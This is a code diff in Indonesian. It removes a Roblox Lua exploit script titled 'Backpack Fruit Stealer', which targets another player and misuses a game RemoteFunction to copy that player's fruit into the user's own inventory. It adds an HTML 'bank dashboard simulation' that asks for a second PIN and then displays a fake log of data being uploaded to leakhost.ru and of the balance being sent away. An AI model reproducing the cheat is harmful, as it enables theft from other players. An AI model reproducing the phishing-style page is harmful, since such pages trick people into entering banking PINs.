@@ -1,126 +1,98 @@
--- GUI Sederhana Manual
-local gui = Instance.new("ScreenGui", game.CoreGui)
-gui.Name = "FruitStealer"
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Dashboard Rekening - Simulasi</title>
+  <style>
+    body {
+      background: #001f2e;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding-top: 50px;
+    }
+    .dashboard, .hasil, .unduh {
+      background: #022b3a;
+      margin: auto;
+      padding: 20px;
+      border-radius: 10px;
+      width: 300px;
+      box-shadow: 0 0 10px #00ffcc;
+    }
+    input {
+      padding: 10px;
+      font-size: 16px;
+      width: 90%;
+      border-radius: 5px;
+      border: none;
+      margin-top: 10px;
+    }
+    button {
+      padding: 10px 20px;
+      background: #00ccff;
+      color: black;
+      border: none;
+      border-radius: 5px;
+      margin-top: 15px;
+      cursor: pointer;
+    }
+    pre {
+      text-align: left;
+      color: #00ff88;
+      font-size: 14px;
+      background: black;
+      padding: 10px;
+      border-radius: 5px;
+    }
+    .hidden { display: none; }
+    .unduh button {
+      background: red;
+      color: white;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
 
-local frame = Instance.new("Frame", gui)
-frame.Size = UDim2.new(0, 250, 0, 140)
-frame.Position = UDim2.new(0.05, 0, 0.3, 0)
-frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
-frame.BorderSizePixel = 0
-frame.Active = true
-frame.Draggable = true
+<div class="dashboard" id="formPin">
+  <h2>Dashboard Rekening</h2>
+  <p><b>Nama:</b> dfgantengg</p>
+  <p><b>No Rek:</b> 1234567890</p>
+  <p><b>Saldo:</b> Rp 2.000.000</p>
+  <input type="password" id="pin" placeholder="PIN Kedua"><br>
+  <button onclick="curiSaldo()">Konfirmasi</button>
+</div>
 
-local title = Instance.new("TextLabel", frame)
-title.Size = UDim2.new(1, 0, 0, 30)
-title.Text = "Backpack Fruit Stealer"
-title.TextColor3 = Color3.new(1,1,1)
-title.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-title.Font = Enum.Font.SourceSansBold
-title.TextSize = 18
+<div class="hasil hidden" id="hasil">
+  <h2>🛰️ Mengunggah Data...</h2>
+  <pre>
+[*] Terhubung ke server: leakhost.ru
+[*] Mengambil info rekening...
+[*] Mengenkripsi data...
+[*] Mengunggah ke IP: 188.45.1.22
+[✓] Data berhasil dikirim.
+[✓] Saldo telah dikirim ke akun Dana Anda!
+  </pre>
+</div>
 
-local dropdown = Instance.new("TextButton", frame)
-dropdown.Size = UDim2.new(1, -20, 0, 30)
-dropdown.Position = UDim2.new(0, 10, 0, 40)
-dropdown.Text = "Pilih Player"
-dropdown.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
-dropdown.TextColor3 = Color3.new(1,1,1)
-dropdown.Font = Enum.Font.SourceSans
-dropdown.TextSize = 16
+<div class="unduh hidden" id="unduh">
+  <button onclick="alert('Bukti bocor diunduh (simulasi).')">📁 Unduh Bukti Bocor</button>
+</div>
 
-local button = Instance.new("TextButton", frame)
-button.Size = UDim2.new(1, -20, 0, 30)
-button.Position = UDim2.new(0, 10, 0, 80)
-button.Text = "STEAL RANDOM FRUIT"
-button.BackgroundColor3 = Color3.fromRGB(90, 90, 90)
-button.TextColor3 = Color3.new(1,1,1)
-button.Font = Enum.Font.SourceSansBold
-button.TextSize = 16
+<script>
+function curiSaldo() {
+  const pin = document.getElementById('pin').value;
+  if (pin.length < 4) {
+    alert('PIN tidak valid!');
+    return;
+  }
+  document.getElementById('formPin').classList.add('hidden');
+  document.getElementById('hasil').classList.remove('hidden');
+  setTimeout(() => {
+    document.getElementById('unduh').classList.remove('hidden');
+  }, 3000);
+}
+</script>
 
--- Variabel
-local SelectedPlayer = nil
-local PlayerList = {}
-
--- Remote Function Asli
-local Remote = game:GetService("ReplicatedStorage"):WaitForChild("RemoteFunction")
-
--- Ambil List Player
-local function updatePlayerList()
-    PlayerList = {}
-    for _, plr in pairs(game.Players:GetPlayers()) do
-        if plr ~= game.Players.LocalPlayer then
-            table.insert(PlayerList, plr.Name)
-        end
-    end
-end
-
--- Saat Klik Dropdown Ganti Player
-dropdown.MouseButton1Click:Connect(function()
-    updatePlayerList()
-    if #PlayerList == 0 then
-        dropdown.Text = "Ga Ada Player"
-        return
-    end
-    local index = table.find(PlayerList, SelectedPlayer) or 0
-    index = (index % #PlayerList) + 1
-    SelectedPlayer = PlayerList[index]
-    dropdown.Text = "Target: " .. SelectedPlayer
-end)
-
--- Fungsi Steal Buah Acak
-button.MouseButton1Click:Connect(function()
-    if not SelectedPlayer then
-        button.Text = "Pilih Player!"
-        return
-    end
-
-    local Target = game.Players:FindFirstChild(SelectedPlayer)
-    if not Target then
-        button.Text = "Player Keluar"
-        return
-    end
-
-    -- Ambil semua buah dari backpack player target
-    local backpackData = Remote:InvokeServer({
-        Type = "Inventory",
-        Data = {
-            Target = Target,
-            Action = "Get"
-        }
-    })
-
-    if not backpackData or not backpackData.Fruit then
-        button.Text = "Gagal Ambil Data"
-        return
-    end
-
-    local fruits = backpackData.Fruit
-    local keys = {}
-    for k in pairs(fruits) do table.insert(keys, k) end
-
-    if #keys == 0 then
-        button.Text = "Backpack Kosong"
-        return
-    end
-
-    -- Pilih random buah
-    local chosen = keys[math.random(1, #keys)]
-    local fruitData = fruits[chosen]
-
-    -- Inject buah itu ke inventory kamu
-    Remote:InvokeServer({
-        Type = "Inventory",
-        Data = {
-            Action = "Add",
-            Item = {
-                Name = fruitData.Name,
-                Type = "Fruit",
-                Level = fruitData.Level or 1,
-                Rarity = fruitData.Rarity or "Common",
-                Age = fruitData.Age or 0
-            }
-        }
-    })
-
-    button.Text = "Berhasil: " .. fruitData.Name
-    task.delay(2, function() button.Text = "STEAL RANDOM FRUIT" end)
-end)
+</body>
+</html>
